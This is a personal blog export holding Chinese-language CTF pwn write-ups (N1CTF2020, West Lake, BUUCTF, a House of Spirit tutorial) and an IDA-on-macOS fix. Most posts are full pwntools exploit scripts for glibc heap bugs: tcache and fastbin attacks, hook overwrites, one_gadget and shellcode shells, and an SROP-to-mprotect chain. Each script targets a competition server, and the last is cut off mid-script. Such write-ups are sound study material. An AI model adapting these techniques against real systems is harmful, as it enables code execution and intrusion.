{"meta":{"title":"Chumen77's Blog","subtitle":"永远相信美好的事情即将发生！","description":null,"author":"chumen77","url":"http://chumen77.xyz","root":"/"},"pages":[{"title":"chumen77","date":"2020-02-23T11:20:33.000Z","updated":"2020-10-21T14:53:26.237Z","comments":true,"path":"about/index.html","permalink":"http://chumen77.xyz/about/index.html","excerpt":"","text":"懒狗一枚🐶 OTczMDU5OTgw"}],"posts":[{"title":"N1CTF2020部分wp","slug":"N1CTF2020部分wp","date":"2020-10-19T09:18:47.650Z","updated":"2020-10-21T11:31:51.119Z","comments":true,"path":"2020/10/19/N1CTF2020部分wp/","link":"","permalink":"http://chumen77.xyz/2020/10/19/N1CTF2020部分wp/","excerpt":"","text":"N1CTF2020部分wpsignin调试one gadget 花了近4小时。。😭 分析c++写的程序，存在add show del的功能，但是进入各自的函数看，看的是稀里糊涂的。个人发现的只是其按照自己的逻辑对内存块idx 1，2进行处理。 因为功能很简单，可以直接上手调试，来确定程序是如何运作的。 上手调试后会发现，其根据3个指针来对idx 1、2 处理。 动调分析def add(idx,data): sla('&gt;','1') sla('dex',str(idx)) sla('ber',str(data)) add(1,1) 看下bss段0x2032a0的数据： pwndbg&gt; x/30gx 0x0002032A0 +0x555555554000 0x5555557572a0: 0x0000555555769e70 0x0000555555769e78 0x5555557572b0: 0x0000555555769e78 0x0000000000000000 pwndbg&gt; x/30gx 0x555555769e60 0x555555769e60: 0x0000000000000000 0x0000000000000021 0x555555769e70: 0x0000000000000001 0x0000000000000000 0x555555769e80: 0x0000000000000000 0x000000000000f181 再次： add(1,1) 看下bss段0x2032a0的数据： pwndbg&gt; x/30gx 0x0002032A0 +0x555555554000 0x5555557572a0: 0x0000555555769e90 0x0000555555769ea0 0x5555557572b0: 0x0000555555769ea0 0x0000000000000000 pwndbg&gt; x/30gx 0x555555769e60 0x555555769e60: 0x0000000000000000 0x0000000000000021 0x555555769e70: 0x0000000000000000 0x0000000000000000 0x555555769e80: 0x0000000000000000 0x0000000000000021 0x555555769e90: 0x0000000000000001 0x0000000000000002 0x555555769ea0: 0x0000000000000000 0x000000000000f161 可以这样接着测试free 和 del的功能。 小总结重点就是bss段储存内存块 1 2 信息的3个指针。 add函数 指针1和3是一个边界指针，指针2是数据编辑指针。根据指针2处来写number数据，一次是8个字节，写完后，指针2会加8。 当指针2大小超过指针3，其就会申请一块新的内存，其申请完内存大小是以0x20,0x20,0x30,0x50,0x90,0x110,0x210,0x410,0x810,0x1010 这样递增。 申请完新内存，会把指针1对应的内存块进行free，也就是上一块chunk。并把上一块内存中的number值进行拷贝到新申请的内存中。并且会根据申请到的chunk地址，进行对bss段3个指针的更新。 free函数 让指针2减8. show 函数 打印出指针2减8后对应地址上的数据信息 攻击思路idx 内存块1 add到有0x1010 chunk块，其原来的0x810会放进unsortbin free 多次，让指针2 指向0x810的fd或者bk处，利用show泄漏出libc地址 free 多次，让指针2指向0x20的fd处，进行tcache attack，修改其为free hook idx 内存块2 add数据，准备上free hook，上free hook 改free hook为one gadget 紧接着程序，就free 上一个chunk，就会触发free hook 但是写完exp，会发现one gadget没有一个可以打通的，栈上存在很多数据，无法满足。尽管使用realloc进行栈帧调整，也没法子。 此时看一下寄存器上的信息，发现刚通过free hook跳转过去后，上面的rdi rsi什么的都指向了可控的heap段，那就修改思路，修改free hook 为system，并且提前修改其rdi指向heap段的数据，修改为sh\\x00 。这样再触发free hook就可以system(sh)了。 exp#!/usr/bin/env python # encoding: utf-8 from pwn import * import time local_file = './signin' elf = ELF(local_file) context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = elf.libc else: io = remote('47.242.161.199',9990) libc = elf.libc # libc = ELF('./libc.so') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' rce18 = [0x4f2c5,0x4f322,0x10a38c] roc = [0,0x2,0x4,0x6,0x8,0x9] arae18 = 0x3ebca0 s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add(idx,data): sla('&gt;','1') sla('dex',str(idx)) sla('ber',str(data)) def free(idx): sla('&gt;','2') sla('dex',str(idx)) def show(idx): sla('&gt;','3') sla('dex',str(idx)) for i in range(258): add(1,0) for i in range(458+57): free(1) show(1) r() libc_base = int(r(15),10) - 0x3ebca0 for i in range(270): free(1) info_addr('libcbase',libc_base) free_hook = 0x3ed8e8 + libc_base add(1,33) add(1,free_hook-8) system = libc.sym['system'] +libc_base add(2,0) add(2,0) free(2) free(2) add(2,26739) add(2,system) add(2,0) itr() oflo存在花指令，无法正常反编译，直接可以用ida或者gdb进行跟即可。但是不能直接打开，会被反调试ptrace检测到，可以attach上去即可。（注意是root权限下。） 开始程序让输入19个字符，关键代码在0x400a69,但是坏的机器码，gdb 下watch一下，发现有流程在根据你输入的东西处理这一块的机器码，输入正确了可以执行下去。在关键代码处，可以发现其是在处理14位的数据，但是刚开始输入的是19个，多出来的5个不知道什么用。调试会发现，其就根据前5个字节，对0x400a69块进行处理，一共处理了10次。可以猜到就是n1ctf。 这块处理完其汇编代码，就正常了。 for ( i = 0; i &lt;= 13; ++i ) &#123; if ( *(&amp;v4 + i) != ((*(char *)(i + a1) + 2) ^ *(char *)(i + a2)) ) 进入以后可以看到关键代码。其是在于起初程序，cat /proc/version到的字符串取前14个在进行xor。要是绕过这里，没有相应字符串，就会出现问题。 expkey = [0x35,0x2D,0x11, 0x1A,0x49,0x7D,0x11, 0x14,0x2B,0x3B,0x3E,0x3D,0x3C,0x5F] data = [0x4C, 0x69, 0x6E, 0x75, 0x78, 0x20, 0x76, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E, 0x20] flag = '' for i in range(len(key)): flag += chr(key[i] ^ (data[i]+2)) print(flag)","categories":[],"tags":[{"name":"re","slug":"re","permalink":"http://chumen77.xyz/tags/re/"},{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"},{"name":"heap","slug":"heap","permalink":"http://chumen77.xyz/tags/heap/"}]},{"title":"House of Spirit","slug":"House of Spirit","date":"2020-10-09T03:45:32.518Z","updated":"2020-10-10T06:41:06.995Z","comments":true,"path":"2020/10/09/House of Spirit/","link":"","permalink":"http://chumen77.xyz/2020/10/09/House of Spirit/","excerpt":"","text":"House of SpiritHouse of Spirit（下面称为hos）是一个组合型漏洞的利用，是变量覆盖和堆管理机制的组合利用，关键在于能够覆盖一个堆指针变量，使其指向可控的区域，只要构造好数据，释放后系统会错误的将该区域作为堆块放到相应的fastbin里面，最后再分配出来的时候，就有可能改写我们目标区域（多为函数指针和返回地址）。 核心条件 有机会覆盖一个堆指针变量，使其指向目标可控的区域 能够在目标可控位置处伪造 fastbin chunk 这样将其这个堆指针释放，会放到相应的fastbin，从而达到分配指定地址的 chunk 的目的。 fastbin fake chunk 需要绕过的检测 fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。 fake chunk 地址需要对齐， MALLOC_ALIGN_MASK fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。 fake chunk 的 next chunk 的大小不能小于 2 * SIZE_SZ，同时也不能大于av-&gt;system_mem 。(这个大小还是很随意的，不必要非得是fastbin 的size 例如 :0x1234) fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。 例子#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; int main() &#123; fprintf(stderr, \"This file demonstrates the house of spirit attack.n\"); //调用一次malloc来初始化堆 fprintf(stderr, \"Calling malloc() once so that it sets up its memory.n\"); malloc(1); //现在我们将覆写一个指针来指向一个伪造的fastbin域 fprintf(stderr, \"We will now overwrite a pointer to point to a fake 'fastbin' region.n\"); unsigned long long *a; //这个和fastbinY无关,不要被这个10所骗,fake_chunks只是一块内存 // This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY) unsigned long long fake_chunks[10] __attribute__ ((aligned (16))); //这个域包含了两个chunk,第一个从fake_chunks[1]开始,另一个从fake_chunks[9]开始 fprintf(stderr, \"This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.n\", sizeof(fake_chunks), &amp;fake_chunks[1], &amp;fake_chunks[9]); //这个chunk的size必须符和fastbin的要求(&lt;=128 x64位系统),PREV_INUSE位在fasybin-sized chunks中也是被忽略的,但是IS_MAPPED和NON_MAIN_AREN会引发一些问题 fprintf(stderr, \"This chunk.size of this region has to be 16 more than the region (to accommodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.n\"); fprintf(stderr, \"... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. n\"); fake_chunks[1] = 0x40; // this is the size //下一个fake chunk的size必须是合法的。 即&gt; 2 * SIZE_SZ（在x64上需要&gt; 16）和＆&lt;av-&gt; system_mem（对于main arena来说，默认为&lt;128kb）并且可以通过nextsize完整性检查。 但是我们无需符和Fastbin的大小 fprintf(stderr, \"The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.n\"); // fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8 fake_chunks[9] = 0x1234; // nextsize //现在我们将通过有着fake first chunks的fake区域地址来覆写我们的指针 fprintf(stderr, \"Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.n\", &amp;fake_chunks[1]); //要注意的是,chunk必须是16字节对齐的 fprintf(stderr, \"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.n\"); a = &amp;fake_chunks[2]; fprintf(stderr, \"Freeing the overwritten pointer.n\"); free(a); //现在下一次的malloc就将会返回我们的fake chunk了 fprintf(stderr, \"Now the next malloc will return the region of our fake chunk at %p, which will be %p!n\", &amp;fake_chunks[1], &amp;fake_chunks[2]); fprintf(stderr, \"malloc(0x30): %pn\", malloc(0x30)); &#125; 正常的hos是需要伪造两个chunk的。 This file demonstrates the house of spirit attack. Calling malloc() once so that it sets up its memory. We will now overwrite a pointer to point to a fake 'fastbin' region. This region (memory of length: 80) contains two chunks. The first starts at 0x7ffe23a56258 and the second at 0x7ffe23a56298. This chunk.size of this region has to be 16 more than the region (to accommodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems. ... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size. Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7ffe23a56258. ... note that the memory address of the *region* associated with this chunk must be 16-byte aligned. Freeing the overwritten pointer. Now the next malloc will return the region of our fake chunk at 0x7ffe23a56258, which will be 0x7ffe23a56260! malloc(0x30): 0x7ffe23a56260 程序首先初始化了一下堆,然后申请了两个变量,一个是我们即将攻击的变量 a,另一个是我们的fake_chunks 程序先在fake_chunks[1]的地方也就是size域伪造了合法的size,0x40(满足fastbin size大小,与16字节对齐,标志位正确) 之后又在下一处伪造了第二个chunk,即从fake_chunks[8]开始的地方,这是为什么呢,因为我们第一个fake chunk的size伪造成了0x40,那么我们第二个chunk就需要在向下0x40的地方也就是fake_chunks+8的地方伪造第二个chunk。 小总结使用该技术分配 chunk 到指定地址，使目标位置成为可控区域，关键是要能够修改指定地址的前后的内容，伪造出2个堆，使其可以绕过对应的检测。 还有就是要有办法覆盖堆指针，到目标地址。 lctf2016_pwn200分析 开头不输入\\n，填充48字符可以泄露出stack地址 有第一段可控的栈，且可以覆盖到heap ptr int sub_400A29() &#123; char buf; // [rsp+0h] [rbp-40h] char *dest; // [rsp+38h] [rbp-8h] dest = (char *)malloc(0x40uLL); puts(\"give me money~\"); read(0, &amp;buf, 0x40uLL); strcpy(dest, &amp;buf); ptr = dest; return sub_4009C4(); &#125; 一次只能申请一个堆，大小0-0x80,且先释放才能再次申请。 保护情况，无任何保护，所以可以写shellcode，jmp 上去即可。 攻击思路 利用可控的栈，hos 在栈上fake 一个堆，保证可以改到ret address 可以先看一下可控栈的内存情况,此前id输入的是65： 前0x40为可控区域，箭头指的方向是可以覆盖的堆指针，id的上方有一个ret address，其在输入3退出时可以跳转到。所以其为目标地址，其前面有可控的0x40的区域，后面也有一个id 0x8的可控区域，满足条件 开始构造： 这样free一下就会有个进入fastbin 在栈上的fake堆，申请上去即可修改到目标区域。 修改ret addree为shellcode的地址。其可以在第一次让你输入时，放入栈中。 exp#!/usr/bin/env python # encoding: utf-8 from pwn import * import time local_file = './pwn200' elf = ELF(local_file) context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',26670) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add(size,data): sla('choice','1') sla('long',str(size)) sa('me',str(data)) def free(): sla('choice','2') shellcode = asm(shellcraft.sh()) sa('u',shellcode) ru('\\x05') leak_stack = uu64(r(6)) info_addr('leak_stack',leak_stack) shellcode_addr = leak_stack - 0x50 # debug() sla('id','65') payload = p64(0)*5 + p64(0x41) + p64(0) + p64(leak_stack - 0x90) sa('money',payload) free() payload = p64(0)*3 + p64(shellcode_addr) add(0x38,payload) sleep(0.2) sla('choice','3') # debug() itr() 参考链接https://www.anquanke.com/post/id/199468#h2-19https://www.anquanke.com/post/id/85357https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack-zh/#house-of-spirit","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"},{"name":"House系列","slug":"House系列","permalink":"http://chumen77.xyz/tags/House系列/"},{"name":"heap","slug":"heap","permalink":"http://chumen77.xyz/tags/heap/"}]},{"title":"西湖论剑部分wp","slug":"西湖论剑部分wp","date":"2020-10-09T00:23:05.599Z","updated":"2020-10-14T15:43:53.754Z","comments":true,"path":"2020/10/09/西湖论剑部分wp/","link":"","permalink":"http://chumen77.xyz/2020/10/09/西湖论剑部分wp/","excerpt":"","text":"西湖论剑部分wpmmutag分析 给了一个栈地址 没有show函数 free 函数存在uaf add函数只能申请堆号为1-10的堆块，大小仅为0x68 可以给栈上读一段数据 char buf; // [rsp+10h] [rbp-20h] if ( v3 != 3 ) break; read(0, &amp;buf, 0x20uLL); printf(\"Your content: %s\\n\", &amp;buf); 利用这个可以泄漏栈上的数据，也可以在栈上写一定的数据。 难点如何泄漏libc地址。 栈上是有很多数据的，可以用choice 3进行泄漏一定的数据，但是由于\\x00的截断，泄漏一个stack地址后，其后有用的libc地址没办法泄漏。 看下其栈情况： 可控区域0x20，如果可以填充其中无用的数据到libc地址，再利用一次 choice 3 即可完成泄漏。 现在也已经知道了stack的地址。伪造一个0x70的堆，然后fastbin attack即可申请到这栈上的内存。然后填充，获取libc地址。接着攻击malloc hook即可。 exp#!/usr/bin/env python # encoding: utf-8 from pwn import * import time local_file = './mmutag' elf = ELF(local_file) context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = elf.libc else: io = remote('183.129.189.61',55704) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] rce18 = [0x4f2c5,0x4f322,0x10a38c] realloc = [0x2,0x4,0x6,0xB,0xC,0xD] arae18 = 0x3ebca0 s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def input_introduce(data): sla('your introduce',str(data)) def add(idx,data): sla('ise','1') sla('id',str(idx)) sa('tent',str(data)) def free(idx): sla('ise','2') sla('id',str(idx)) data = '1' * 0x60 sa('name',data) ru('0x') leak_libc = int(r(12),16) sla('ice','2') add(1,'chumen77') add(2,'chumen77') free(1) free(2) free(1) sla('ise','3') payload = p64(0) + p64(0x70) + p64(0) s(payload) add(4,p64(leak_stack - 0x40)) add(5,'1') add(6,'1') add(7,'1' * 0x47 + '2') sla('ise','3') s('1' * 0x20) info_addr('leak-stack',leak_stack) ru('2') libc_base = uu64(r(6)) - 0x20840 info_addr('libc_base',libc_base) free(1) free(2) free(1) malloc_hook = 0x3c4aed + libc_base add(3,p64(malloc_hook)) add(8,'1') add(9,'1') one = 0xf0364 + libc_base payload = (3 + 0x10) * '\\x00' + p64(one) add(10,payload) free(3) free(3) # debug() itr() 最后因为没有堆可以申请，可以故意触发报错，其会调用到malloc来储存部分数据，此时也就可以get shell。 ezhttp看起来较为复杂，因为实现了一个对Http packet的交互，让我这种不是很熟悉http packet，coding能力差的人，逆向起来有点吃力。 分析前置技能 简易的Http packet结构 setcontext 函数的exploit 各种不熟悉的字符串处理函数sscanf strchr strtok 程序分析 开头初始化，开启了沙箱，只能orw来获取flag add函数，以输入的字符数量来给你分配堆，所以\\x00用不了了，最大0x100，且给了heap的地址 del 函数，存在uaf 无show函数 edit函数，可以输入\\x00的字符，无vul 攻击思路 free 0x100的chunk 8次，使其进入unsortbin，留着攻击stdout tcache attack 攻击到_IO_2_1_stdout_ ，使其泄漏libc地址 tcache attack 攻击free hook，写上setcontext + 53 ，准备srop进行攻击 srop读入mprotect的rop chain，开启heap段的执行权限 edit 一个heap的内存为 orw flag 触发free hook，orw get flag 细节集合对于stdout的攻击其中，在利用libc残留伪造stdout地址作为fd的时候，只要改3字节，其肯定是申请的0x20的堆，但是上stdout结构体时需要0x21字节的写入。tcache分配中，并不验证堆的大小，只要fd指好就OK了，所以申请个至少可以写入0x21字节的堆即可。但是由于程序分配chunk的策略，申请时肯定要写数据，写什么不会crush。个人做的时候,乱填充数据，crush了很多次，头都炸了。可以看一下_IO_2_1_stdout_结构体： pwndbg&gt; ptype stdout type = struct _IO_FILE &#123; int _flags; char *_IO_read_ptr; char *_IO_read_end; char *_IO_read_base; char *_IO_write_base; char *_IO_write_ptr; char *_IO_write_end; char *_IO_buf_base; char *_IO_buf_end; char *_IO_save_base; char *_IO_backup_base; char *_IO_save_end; struct _IO_marker *_markers; struct _IO_FILE *_chain; int _fileno; int _flags2; __off_t _old_offset; unsigned short _cur_column; signed char _vtable_offset; char _shortbuf[1]; _IO_lock_t *_lock; __off64_t _offset; struct _IO_codecvt *_codecvt; struct _IO_wide_data *_wide_data; struct _IO_FILE *_freeres_list; void *_freeres_buf; size_t __pad5; int _mode; char _unused2[20]; &#125; * 在学习io file相关知识时，可以了解到对于获取和输出信息，很重要的就是开头_flags ，其决定了此时io的状况。 其中注意到_flags 大小是int型，所以在libc地址其读取和验证将要做什么时，是以int的宽度来获取的。所以设置对低位8字节即可。比如0xfffffffffbad3c80 0x12345678fbad3c80 ,剩下的就好说了，全弄成a的垃圾字符堆。 然后再次edit，这个_IO_2_1_stdout_即可泄漏出libc地址。 改free hook写setcontext时的细节其中需要注意一下libc版本，在最低的libc 2.27版本中，其经常是以0xXXXXXXX00a0这样的存在。直接改写时，/x00被截断，写不上free hook。然后想着用edit 进行修改。但是会发现，此时坏的free hook情况下，用edit直接crush。 考虑升级一下libc版本号对应对赛题服务器的libc版本，但是libc2.27最近更新了，直接apt upgrade libc6 就会升级到libc 2.27:1.3最新版本，其增加了对double free的检测，就直接做不了了。 apt 指定版本的升级： apt-cache madison libc6 apt-get install libc6=2.27-3ubuntu1.2 apt-cache madison libc6-dbg apt-get install libc6-dbg=2.27-3ubuntu1.2 这样就升级好了，并且解决了个人写setcontext的问题，因为其地址没有再有``x00 ### exp ```python #!/usr/bin/env python # encoding: utf-8 from pwn import * import time local_file = &apos;./ezhttp&apos; elf = ELF(local_file) context.log_level = &apos;debug&apos; debug = 1 if debug: io = process(local_file) libc = elf.libc else: io = remote(&apos;172.17.0.2&apos;,23946) libc = elf.libc #libc = ELF(&apos;.&apos;) context.arch = elf.arch context.terminal = [&apos;tmux&apos;,&apos;neww&apos;] #,&apos;&apos;splitw&apos;,&apos;-h&apos; arae18 = 0x3ebca0 s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, &apos;\\0&apos;)) uu64 = lambda data :u64(data.ljust(8, &apos;\\0&apos;)) info_addr = lambda tag, addr :io.info(tag + &apos;==&gt;&apos; +&apos;: &#123;:#x&#125;&apos;.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript=&apos;b main&apos;) gdb.attach(io) pause() # debug() def add(data): content = &apos;POST\\n&apos; content += &apos;/create \\nCookie: user=admin token: \\r\\n\\r\\n&apos; content += &apos;content=&apos;+str(data) ru(&apos;Send Http packet to me:&apos;) s(str(content)) sleep(0.05) def free(index): content = &apos;POST\\n&apos; content += &apos;/del \\nCookie: user=admin token: \\r\\n\\r\\n&apos; content += &apos;index=&apos;+str(index) ru(&apos;Send Http packet to me:&apos;) s(str(content)) def edit(idx,data): content = &apos;POST\\n&apos; content += &apos;/edit \\nCookie: user=admin token: \\r\\n\\r\\n&apos; content += &apos;index=&apos;+ str(idx) + &apos;&amp;content=&apos;+str(data)+ &apos;\\n&apos; s(str(content)) sleep(0.05) def leak_addr(): payload = &apos;1&apos; *0x100 add(payload) ru(&apos;0x&apos;) heap_base = int(r(12),16) - 0x10 info_addr(&apos;heap_base&apos;,heap_base) add(payload) add(&apos;1&apos;*0x8) add(&apos;1&apos;*0xf8) for i in range(7): free(0) free(0) add(&apos;\\x60\\xa7&apos;) add(&apos;1&apos;*0x18) add(&apos;1&apos;*0x20) free(6) free(6) add(&apos;1&apos;*0x20) payload = p64(heap_base + 0x10) edit(7,payload) add(&apos;1&apos;*0x20) # debug() add(&apos;1&apos;*0x20) sleep(0.1) payload = p64(0x12345678fbad3c80) + &apos;\\x01&apos; *0x20 add(payload) #8 payload = p64(0xfbad3c80) + p64(0) * 3 + &apos;\\x00&apos; edit(10,payload) add(&apos;1&apos;*0x90) return heap_base leak = 0 while True: try: heap_base = leak_addr() ss = io.recvuntil(chr(0x7f),timeout = 0.5) if len(ss) == 0: raise Exception(&apos;&apos;) io.recv(16) leak = u64(io.recv(8)) if leak == 0x320a6464412e310a: raise Exception(&apos;&apos;) break except Exception: io.close() io = process(&apos;./ezhttp&apos;) continue leak = leak &gt;&gt; 16 info_addr(&apos;leak&apos;,leak) libc_base = leak - 0x3eb780 info_addr(&apos;libc_base&apos;,libc_base) free_hook = 0x3ed8e8 + libc_base set_context = libc.sym[&apos;setcontext&apos;] + 53 + libc_base info_addr(&apos;heap_base&apos;,heap_base) info_addr(&apos;context&apos;,set_context) orw = shellcraft.open(&apos;./flag&apos;) orw +=shellcraft.read(&apos;rax&apos;,heap_base+0x300,0x30) orw +=shellcraft.write(1,heap_base+0x300,0x30) edit(11,asm(orw)) # debug() frame = SigreturnFrame() frame.rdi = 0 frame.rsi = free_hook frame.rdx = 0x300 frame.rsp = free_hook frame.rip = libc_base + libc.search(asm(&quot;syscall \\nret&quot;)).next() edit(1,str(frame)) free(2) free(2) free(2) # debug() add(p64(free_hook)) add(&apos;1&apos;*6) info_addr(&apos;context&apos;,set_context) add(p64(set_context)) # debug() free(1) pop_rdi = 0x000000000002155f+libc_base pop_rsi = 0x0000000000023e8a+libc_base pop_rdx = libc_base+0x0000000000001b96 pop_rax = libc_base+0x0000000000043a78 payload = flat([pop_rdi,heap_base-0x250,pop_rsi,0x1000,pop_rdx,7,libc_base+libc.sym[&apos;mprotect&apos;],heap_base+0x80]) s(payload) itr()","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"}]},{"title":"mac 上ida 7.0 闪退 打不开 解决办法","slug":"mac 上ida 7.0 闪退 打不开 解决办法","date":"2020-10-06T14:37:29.022Z","updated":"2020-10-09T00:22:47.125Z","comments":true,"path":"2020/10/06/mac 上ida 7.0 闪退 打不开 解决办法/","link":"","permalink":"http://chumen77.xyz/2020/10/06/mac 上ida 7.0 闪退 打不开 解决办法/","excerpt":"","text":"mac 上ida 7.0 闪退 打不开 解决办法情景1下载以后直接不能用的。 https://github.com/fjh658/IDA7.0_SP https://github.com/swfangzhang/IDA-pro-7-for-Catalina-OSX-15 参考这个两个github的项目即可。 情景2平时正常使用，突然因为装了冲突的插件打不开ida，直接crash。或者莫名点击ida图标就没有任何反应。进入ida.app bin 下的ida，双击执行命令行中，会显示内核错误的情况。 ~ cd .idapro ~/.idapro rm -rf ida.reg 这样就可以解决了。","categories":[],"tags":[{"name":"杂项","slug":"杂项","permalink":"http://chumen77.xyz/tags/杂项/"}]},{"title":"BUUCTF 刷题记录","slug":"BUUCTF刷题记录","date":"2020-09-28T11:24:58.046Z","updated":"2020-10-21T11:36:10.414Z","comments":true,"path":"2020/09/28/BUUCTF刷题记录/","link":"","permalink":"http://chumen77.xyz/2020/09/28/BUUCTF刷题记录/","excerpt":"","text":"BUUCTF刷题记录GKCTF 2020 demo分析开启了沙箱，不过在main函数的最后，在while循环里做动作就不会触发到。其中add和free 函数，上来都会检测free_hook malloc_hook 是否不为0，不为0就不让进行相应的操作。 漏洞点if ( (nbytes &amp; 0x80000000) == 0LL &amp;&amp; nbytes &lt;= 0x120 ) &#123; heaplist[SHIDWORD(nbytes)] = malloc(nbytes); puts(\"content:\"); read(0, heaplist[SHIDWORD(nbytes)], nbytes); *(heaplist[SHIDWORD(nbytes)] + nbytes) = 0;// off by null ++counts; &#125; Add中存在OFF BY NULL。 攻击思路 利用off by null 构造一个堆重叠 泄漏出libc地址 2次释放重叠的chunk，进行fastbin attack malloc_hook_为 one gadget 通过读入choice的scanf函数，传送大量字节，其会调用malloc申请chunk，即可get shell expfrom pwn import * import time local_file = './domo' elf = ELF(local_file) context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',27019) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] realloc = [0x2,0x4,0x6,0xB,0xC,0xD] s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() ''' line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x07 0xc000003e if (A != ARCH_X86_64) goto 0009 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x35 0x00 0x01 0x40000000 if (A &lt; 0x40000000) goto 0005 0004: 0x15 0x00 0x04 0xffffffff if (A != 0xffffffff) goto 0009 0005: 0x15 0x03 0x00 0x0000000a if (A == mprotect) goto 0009 0006: 0x15 0x02 0x00 0x0000003b if (A == execve) goto 0009 0007: 0x15 0x01 0x00 0xffffd8b6 if (A == 0xffffd8b6) goto 0009 0008: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0009: 0x06 0x00 0x00 0x00000000 return KILL ''' def add(size,data): sla('&gt;','1') sla('size',str(size)) sa('tent',str(data)) def free(idx): sla('&gt;','2') sla('dex',str(idx)) def show(idx): sla('&gt;','3') sla('dex',str(idx)) add(0x80,'1') add(0x68,'1') add(0xf0,'1') 